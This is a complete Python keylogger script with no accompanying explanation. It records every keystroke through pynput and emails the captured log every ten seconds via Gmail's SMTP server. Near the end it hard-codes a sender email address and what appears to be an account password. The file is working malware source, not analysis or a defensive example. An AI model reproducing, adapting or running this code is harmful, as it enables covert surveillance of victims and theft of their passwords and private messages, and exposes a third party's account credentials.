#!/usr/bin/env python3
import pynput.keyboard
import threading
import smtplib
class keylogger:
	def __init__(self,time_interval,email,password):
		self.log="Keylogger started" 
		self.interval=time_interval
		self.email=email
		self.password=password
	def append_to_log(self,key_string):
		self.log=self.log+key_string

	def key_press(self,key):
		try:
			current_key=str(key.char)
		except AttributeError:
			if(key==key.space):
				current_key=" "
			else:
				current_key=" "+str(key)+" "
		self.append_to_log(current_key)		

	def report(self):
		print(self.log)
		self.send_mail(self.email,self.password,self.log)
		self.log=""
		timer=threading.Timer(self.interval,self.report)
		timer.start()

	def send_mail(self,email,password,msg):
	    server=smtplib.SMTP('smtp.gmail.com', 587)
	    server.starttls()
	    server.login(email,password)
	    server.sendmail(email,email,msg)
	    server.quit()

	def start(self):
		keyboard_listner=pynput.keyboard.Listener(on_press=self.key_press)
		self.report()
		keyboard_listner.start()
		keyboard_listner.join()


keylogger=keylogger(10,"mittal891604@gmail.com","rcudeucbnjnlpigl")
keylogger.start()

	